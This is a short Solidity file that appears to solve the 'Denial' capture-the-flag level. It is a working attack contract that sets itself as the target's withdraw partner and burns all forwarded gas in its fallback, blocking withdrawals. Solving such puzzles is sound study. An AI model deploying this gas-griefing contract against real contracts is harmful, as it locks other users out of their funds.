pragma solidity ^0.8;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Hack {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // Burn all gas - same as assert(false) in Solidity < 0.8
        assembly {
            invalid()
        }
    }
}
